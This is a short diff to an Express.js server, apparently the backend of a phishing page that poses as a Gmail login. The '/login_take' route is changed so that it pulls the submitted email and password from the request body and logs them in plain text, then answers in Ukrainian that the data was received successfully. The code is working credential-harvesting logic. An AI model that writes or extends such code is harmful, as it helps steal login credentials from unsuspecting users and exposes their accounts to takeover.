@@ -26,12 +26,11 @@ app.post("/track-login", (req, res) => {
 
 app.post("/login_take", (req, res) => {
     console.log("GMAIL");
-    console.log(req.body);
-    //const { login, password } = req.body;
+    const { email, password } = req.body;
 
-    //console.log("Success!");
-    //console.log("Login:", login);
-    //console.log("Password:", password);
+    console.log("Success!");
+    console.log("Email:", email);
+    console.log("Password:", password);
 
     res.json({ message: "Дані отримані успішно!" });
 });
